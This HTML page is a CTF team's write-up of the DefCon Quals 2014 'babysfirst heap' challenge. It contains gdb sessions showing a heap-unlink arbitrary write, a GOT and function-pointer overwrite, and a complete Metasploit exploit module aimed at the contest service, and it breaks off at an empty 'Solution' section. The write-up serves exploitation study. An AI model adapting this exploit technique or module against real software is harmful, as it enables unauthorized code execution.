
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>CaptchaFlag CTF Team</title>
  <meta name="author" content="Captchaflag">

  
  <meta name="description" content="Analysis 1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50 &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://www.captchaflag.com/blog/page/2/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="/javascripts/ender.js"></script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <link href="/atom.xml" rel="alternate" title="CaptchaFlag CTF Team" type="application/atom+xml">
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  
  <script type="text/javascript">
    var _gaq = _gaq || [];
    _gaq.push(['_setAccount', 'UA-37376887-1']);
    _gaq.push(['_trackPageview']);

    (function() {
      var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
      ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
      var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
    })();
  </script>


</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">CaptchaFlag CTF Team</a></h1>
  
    <h2>Blog by the Captchaflag CTF Team</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="http://google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="q" value="site:www.captchaflag.com" />
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/">DefCon Quals 2014 - Babysfirst Heap</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-05-23T13:27:00-04:00" pubdate data-updated="true">May 23<span>rd</span>, 2014</time>
        
         | <a href="/blog/2014/05/23/defcon-quals-2014-babysfirst-heap/#disqus_thread">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>Analysis</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit function pointer is at 804C8AC address.
</span><span class='line'>[ALLOC][loc=8ED2008][size=1246]
</span><span class='line'>[ALLOC][loc=8ED24F0][size=1121]
</span><span class='line'>[ALLOC][loc=8ED2958][size=947]
</span><span class='line'>[ALLOC][loc=8ED2D10][size=741]
</span><span class='line'>[ALLOC][loc=8ED3000][size=706]
</span><span class='line'>[ALLOC][loc=8ED32C8][size=819]
</span><span class='line'>[ALLOC][loc=8ED3600][size=673]
</span><span class='line'>[ALLOC][loc=8ED38A8][size=1004]
</span><span class='line'>[ALLOC][loc=8ED3C98][size=952]
</span><span class='line'>[ALLOC][loc=8ED4058][size=755]
</span><span class='line'>[ALLOC][loc=8ED4350][size=260]
</span><span class='line'>[ALLOC][loc=8ED4458][size=877]
</span><span class='line'>[ALLOC][loc=8ED47D0][size=1245]
</span><span class='line'>[ALLOC][loc=8ED4CB8][size=1047]
</span><span class='line'>[ALLOC][loc=8ED50D8][size=1152]
</span><span class='line'>[ALLOC][loc=8ED5560][size=1047]
</span><span class='line'>[ALLOC][loc=8ED5980][size=1059]
</span><span class='line'>[ALLOC][loc=8ED5DA8][size=906]
</span><span class='line'>[ALLOC][loc=8ED6138][size=879]
</span><span class='line'>[ALLOC][loc=8ED64B0][size=823]
</span><span class='line'>Write to object [size=260]:
</span><span class='line'>Copied 16 bytes.
</span><span class='line'>[FREE][address=8ED2008]
</span><span class='line'>[FREE][address=8ED24F0]
</span><span class='line'>[FREE][address=8ED2958]
</span><span class='line'>[FREE][address=8ED2D10]
</span><span class='line'>[FREE][address=8ED3000]
</span><span class='line'>[FREE][address=8ED32C8]
</span><span class='line'>[FREE][address=8ED3600]
</span><span class='line'>[FREE][address=8ED38A8]
</span><span class='line'>[FREE][address=8ED3C98]
</span><span class='line'>[FREE][address=8ED4058]
</span><span class='line'>[FREE][address=8ED4350]
</span><span class='line'>[FREE][address=8ED4458]
</span><span class='line'>[FREE][address=8ED47D0]
</span><span class='line'>[FREE][address=8ED4CB8]
</span><span class='line'>[FREE][address=8ED50D8]
</span><span class='line'>[FREE][address=8ED5560]
</span><span class='line'>[FREE][address=8ED5980]
</span><span class='line'>[FREE][address=8ED5DA8]
</span><span class='line'>[FREE][address=8ED6138]
</span><span class='line'>[FREE][address=8ED64B0]
</span><span class='line'>Did you forget to read the flag with your shellcode?
</span><span class='line'>Exiting</span></code></pre></td></tr></table></div></figure>

<p>Presumably a heap overflow. It appears as if we are going to write to the buffer that is allocated for 260 bytes, and presumably can overwrite into the next heap buffer. Looking at the addresses and sizes provided, all of the buffers are bumped up against one another. An uncontrolled write will allow us to overwrite heap metadata of another block, which when freed will attempt to unlink and coalesce. Let&#8217;s play around with the inputs:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;AAAABBBB&quot;+&quot;C&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>gdb babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>Welcome to your first heap overflow...
</span><span class='line'>I am going to allocate 20 objects...
</span><span class='line'>Using Dougle Lee Allocator 2.6.1...
</span><span class='line'>Goodluck!
</span><span class='line'>
</span><span class='line'>Exit <span class="k">function </span>pointer is at 804C8AC address.
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D008<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1246<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D4F0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1121<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804D958<span class="o">][</span><span class="nv">size</span><span class="o">=</span>947<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804DD10<span class="o">][</span><span class="nv">size</span><span class="o">=</span>741<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E000<span class="o">][</span><span class="nv">size</span><span class="o">=</span>706<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E2C8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>819<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E600<span class="o">][</span><span class="nv">size</span><span class="o">=</span>673<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804E8A8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1004<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804EC98<span class="o">][</span><span class="nv">size</span><span class="o">=</span>952<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F058<span class="o">][</span><span class="nv">size</span><span class="o">=</span>755<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F350<span class="o">][</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F458<span class="o">][</span><span class="nv">size</span><span class="o">=</span>877<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804F7D0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1245<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>804FCB8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80500D8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1152<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050560<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1047<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050980<span class="o">][</span><span class="nv">size</span><span class="o">=</span>1059<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8050DA8<span class="o">][</span><span class="nv">size</span><span class="o">=</span>906<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>8051138<span class="o">][</span><span class="nv">size</span><span class="o">=</span>879<span class="o">]</span>
</span><span class='line'><span class="o">[</span>ALLOC<span class="o">][</span><span class="nv">loc</span><span class="o">=</span>80514B0<span class="o">][</span><span class="nv">size</span><span class="o">=</span>823<span class="o">]</span>
</span><span class='line'>Write to object <span class="o">[</span><span class="nv">size</span><span class="o">=</span>260<span class="o">]</span>:
</span><span class='line'>Copied 265 bytes.
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D008<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D4F0<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804D958<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804DD10<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E000<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E2C8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E600<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804E8A8<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804EC98<span class="o">]</span>
</span><span class='line'><span class="o">[</span>FREE<span class="o">][</span><span class="nv">address</span><span class="o">=</span>804F058<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>Program received signal SIGSEGV, Segmentation fault.
</span><span class='line'>0x080493f6 in free <span class="o">(</span><span class="nv">mem</span><span class="o">=</span>0x804f058<span class="o">)</span> at malloc.c:1259
</span><span class='line'>1259    in malloc.c
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x80493f6 &lt;free+273&gt;:   mov    %edx,0x8<span class="o">(</span>%eax<span class="o">)</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info reg
</span><span class='line'>eax            0x41414141   1094795585
</span><span class='line'>ecx            0x804d004    134533124
</span><span class='line'>edx            0x42424242   1111638594
</span></code></pre></td></tr></table></div></figure>

<p>There&#8217;s a controlled 4-byte write. In order to gain execution, we can overwrite
the GOT (targeting printf(), which is repeatedly called in between freeing
buffers) or target the do_exit() function pointer which they provide to us.</p>

<p>Let&#8217;s target printf():
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>objdump -R babyfirst-heap<em>33ecf0ad56efc1b322088f95dd98827c  | grep <span class="nb">printf</span>
</span><span class='line'>0804c004 R</em>386<em>JUMP</em>SLOT   <span class="nb">printf</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Also, notice that this is occuring during the free of 0x804F058, the block prior to the one allocated for 260 bytes. Since the write is accessing eax+8, we need to subtract 8 from our target address. We can overwrite the GOT entry for printf to point to our shellcode on the heap. For this example, I&#8217;ll replace &quot;AAAA&quot; with printf() GOT - 8, &quot;BBBB&quot; with heap buffer + 8 (to skip our addresses), and replace &quot;C&quot; with &quot;\xCC&quot;, for a breakpoint.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>stacks0n@ubuntu:~/Desktop<span class="nv">$ </span>python -c <span class="s1">&#39;print &quot;\xfc\xbf\x04\x08&quot;+&quot;\x58\xf3\x04\x08&quot;+&quot;\xCC&quot;*252+&quot;\x00\x00\x00\x00&quot;&#39;</span> &gt; input
</span><span class='line'>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run &lt; input
</span><span class='line'>...
</span><span class='line'>Program received signal SIGTRAP, Trace/breakpoint trap.
</span><span class='line'>0x0804f359 in ?? <span class="o">()</span>
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /5i <span class="nv">$eip</span>
</span><span class='line'><span class="o">=</span>&gt; 0x804f359:   int3
</span><span class='line'>   0x804f35a:   int3
</span><span class='line'>   0x804f35b:   int3
</span><span class='line'>   0x804f35c:   cld
</span><span class='line'>   0x804f35d:   mov    <span class="nv">$0xcccc0804</span>,%edi
</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> x /16bx <span class="nv">$eip</span>
</span><span class='line'>0x804f359:  0xcc    0xcc    0xcc    0xfc    0xbf    0x04    0x08    0xcc
</span><span class='line'>0x804f361:  0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc    0xcc
</span></code></pre></td></tr></table></div></figure>

<p>Great! We hit our breakpoint. However, notice that 0x0804bffc has been written here. That&#8217;s due to unlink() fixing up both BK-&gt;FD and FD-&gt;BK. we can avoid this by putting a simple &#8216;jmp&#8217; in our payload. For example, &#8216;jmp 12&#8217; corresponds to &#8216;\xeb\x0c&#8217;.</p>

<h2>Code</h2>

<p>Note, during the competition, this code was used for exploiting the service and
retrieving the key. It targeted overwriting the do_exit() function pointer, which resulted in all buffers being freed prior to getting code execution. This required safely
<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="nb">require</span> <span class="s1">&#39;msf/core&#39;</span>
</span><span class='line'>
</span><span class='line'><span class="k">class</span> <span class="nc">Metasploit3</span> <span class="o">&lt;</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span>
</span><span class='line'>  <span class="no">Rank</span> <span class="o">=</span> <span class="no">GreatRanking</span>
</span><span class='line'>
</span><span class='line'>  <span class="kp">include</span> <span class="no">Msf</span><span class="o">::</span><span class="no">Exploit</span><span class="o">::</span><span class="no">Remote</span><span class="o">::</span><span class="no">Tcp</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">initialize</span><span class="p">(</span><span class="n">info</span> <span class="o">=</span> <span class="p">{})</span>
</span><span class='line'>    <span class="k">super</span><span class="p">(</span><span class="n">update<em>info</span><span class="p">(</span><span class="n">info</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Name&#39;</span>           <span class="o">=&gt;</span> <span class="s1">&#39;heap&#39;</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Description&#39;</span>    <span class="o">=&gt;</span> <span class="sx">%q{</span>
</span><span class='line'><span class="sx">            heap overflow</span>
</span><span class='line'><span class="sx">      }</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Author&#39;</span>         <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;stacks0n&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Privileged&#39;</span>     <span class="o">=&gt;</span> <span class="kp">false</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Platform&#39;</span>       <span class="o">=&gt;</span> <span class="o">[</span> <span class="s1">&#39;linux&#39;</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>                        <span class="s1">&#39;Arch&#39;</span>           <span class="o">=&gt;</span> <span class="no">ARCH</em>X86</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;Targets&#39;</span>        <span class="o">=&gt;</span> <span class="o">[</span> <span class="o">[</span> <span class="s1">&#39;Automatic&#39;</span><span class="p">,</span> <span class="p">{</span> <span class="p">}</span>  <span class="o">]</span><span class="p">,</span> <span class="o">]</span><span class="p">,</span>
</span><span class='line'>      <span class="s1">&#39;DefaultTarget&#39;</span>  <span class="o">=&gt;</span> <span class="mi">0</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">register<em>options</span><span class="p">(</span>
</span><span class='line'>      <span class="o">[</span>
</span><span class='line'>                <span class="no">Opt</span><span class="o">::</span><span class="no">RHOST</span><span class="p">(</span><span class="s1">&#39;babyfirst-heap</em>33ecf0ad56efc1b322088f95dd98827c.2014.shallweplayaga.me&#39;</span><span class="p">),</span>
</span><span class='line'>        <span class="no">Opt</span><span class="o">::</span><span class="no">RPORT</span><span class="p">(</span><span class="mi">4088</span><span class="p">)</span>
</span><span class='line'>      <span class="o">]</span><span class="p">,</span> <span class="nb">self</span><span class="o">.</span><span class="n">class</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="k">def</span> <span class="nf">exploit</span>
</span><span class='line'>    <span class="n">connect</span>
</span><span class='line'>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="n">data</span> <span class="o">=</span> <span class="n">sock</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">print</span> <span class="n">data</span>
</span><span class='line'>        <span class="n">addr</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="c1"># [ALLOC][loc=874F058][size=755]</span>
</span><span class='line'>        <span class="n">data</span><span class="o">.</span><span class="n">split</span><span class="p">()</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">elem</span><span class="o">|</span>
</span><span class='line'>          <span class="k">if</span> <span class="n">elem</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\</span><span class="s2">[ALLOC</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[loc=(.<em>)</span><span class="se">\</span><span class="s2">]</span><span class="se">\</span><span class="s2">[size=(.</em>)</span><span class="se">\</span><span class="s2">]&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="c1"># size</span>
</span><span class='line'>            <span class="k">if</span> <span class="vg">$2</span> <span class="o">==</span> <span class="s2">&quot;260&quot;</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="vg">$1</span>
</span><span class='line'>              <span class="n">addr</span> <span class="o">=</span> <span class="o">[</span><span class="n">addr</span><span class="o">.</span><span class="n">to<em>i</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">+</span><span class="mi">8</span><span class="o">].</span><span class="n">pack</span><span class="p">(</span><span class="s2">&quot;&lt;V&quot;</span><span class="p">)</span>
</span><span class='line'>            <span class="k">end</span>
</span><span class='line'>          <span class="k">end</span>
</span><span class='line'>        <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>        <span class="nb">p</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do</em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xeb\x0C</span><span class="s2">&quot;</span> <span class="c1"># jmp 12</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x90</span><span class="s2">&quot;</span><span class="o"><em></span><span class="mi">16</span> <span class="c1"># why not?</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">payload</span><span class="o">.</span><span class="n">encoded</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span> <span class="o"></em></span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">p</span><span class="o">.</span><span class="n">size</span><span class="p">)</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\x01\x00\x00\x00</span><span class="s2">&quot;</span> <span class="c1"># overwrite the size block</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="s2">&quot;</span><span class="se">\xa4\xc8\x04\x08</span><span class="s2">&quot;</span> <span class="c1"># do<em>exit() - 8</span>
</span><span class='line'>        <span class="nb">p</span> <span class="o">+=</span> <span class="n">addr</span>
</span><span class='line'>        <span class="n">print</em>status</span> <span class="nb">p</span><span class="o">.</span><span class="n">inspect</span>
</span><span class='line'>
</span><span class='line'>        <span class="c1"># send the payload</span>
</span><span class='line'>        <span class="n">sock</span><span class="o">.</span><span class="n">put</span><span class="p">(</span><span class="nb">p</span> <span class="o">+</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
</span><span class='line'>        <span class="n">print<em>status</span> <span class="n">sock</span><span class="o">.</span><span class="n">get</em>once</span>
</span><span class='line'>
</span><span class='line'>    <span class="n">handler</span>
</span><span class='line'>    <span class="n">disconnect</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="k">end</span>
</span></code></pre></td></tr></table></div></figure></p>

<h2>Solution</h2>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
